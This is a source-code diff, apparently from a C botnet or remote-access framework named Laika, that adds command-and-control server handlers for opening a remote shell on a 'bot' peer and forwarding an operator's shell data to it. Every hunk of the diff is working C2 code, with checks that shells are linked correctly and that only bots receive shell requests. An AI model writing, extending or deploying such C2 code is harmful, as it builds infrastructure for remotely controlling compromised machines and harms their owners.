@@ -67,17 +67,44 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
     struct sLaika_cnc *cnc = aInfo->info.cnc;
     struct sLaika_peer *peer;
 
+    /* sanity check, make sure shell isn't already open */
+    if (aInfo->shellBot)
+        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Shell already open!\n");
+
     /* read pubkey & find peer */
     laikaS_read(&authPeer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
     if ((peer = laikaC_getPeerByPub(cnc, pubKey)) == NULL)
         LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer doesn't exist!\n");
 
+    if (peer->type != PEER_BOT)
+        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer isn't a bot!\n");
+
+    /* link shells */
     aInfo->shellBot = peer;
+    ((struct sLaika_botInfo*)(peer->uData))->shellAuth = authPeer;
 
     /* forward the request to open a shell */
     laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_OPEN);
 }
 
 void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
+    uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
+    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
+    struct sLaika_cnc *cnc = aInfo->info.cnc;
+    struct sLaika_peer *peer;
 
+    /* sanity check, make sure shell is open */
+    if ((peer = aInfo->shellBot) == NULL)
+        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Not shell open!\n");
+
+    if (sz > LAIKA_SHELL_DATA_MAX_LENGTH)
+        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Data too big!\n");
+
+    /* read data */
+    laikaS_read(&authPeer->sock, data, sz);
+
+    /* forward data to peer */
+    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+    laikaS_write(&peer->sock, data, sz);
+    laikaS_endVarPacket(peer);
 }
